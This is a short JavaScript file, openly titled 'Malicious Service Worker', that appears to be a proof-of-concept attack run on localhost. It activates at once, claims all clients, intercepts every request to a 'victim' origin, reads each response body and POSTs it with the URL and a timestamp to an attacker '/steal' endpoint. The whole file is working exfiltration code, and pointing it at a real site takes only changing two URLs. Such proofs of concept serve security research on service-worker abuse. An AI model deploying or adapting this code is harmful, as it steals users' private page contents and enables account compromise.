// Malicious Service Worker
let isAttacking = false;

// Install event - skip waiting to activate immediately
self.addEventListener('install', (event) => {
    console.log('Service Worker installed');
    self.skipWaiting();
});

// Activate event - claim clients immediately
self.addEventListener('activate', (event) => {
    console.log('Service Worker activated');
    event.waitUntil(clients.claim());
});

// Listen for messages from the attacker's page
self.addEventListener('message', event => {
    if (event.data.type === 'START_ATTACK') {
        console.log('Starting attack on:', event.data.target);
        isAttacking = true;
    }
});

// Intercept all requests
self.addEventListener('fetch', (event) => {
    console.log('Service Worker intercepted fetch:', event.request.url);
    
    // Intercept requests to the victim's origin
    if (event.request.url.startsWith('http://localhost:8001')) {
        event.respondWith(
            fetch(event.request)
                .then(response => {
                    // Clone the response so we can read it
                    const responseClone = response.clone();
                    
                    // Read the response body
                    responseClone.text().then(body => {
                        console.log('Intercepted response from victim:', body);
                        
                        // Send the intercepted data to the attacker's server
                        fetch('http://localhost:8000/steal', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({
                                url: event.request.url,
                                response: body,
                                timestamp: new Date().toISOString()
                            })
                        }).catch(console.error);
                    });
                    
                    return response;
                })
                .catch(error => {
                    console.error('Fetch error:', error);
                    return new Response('Error: ' + error.message);
                })
        );
    }
});
  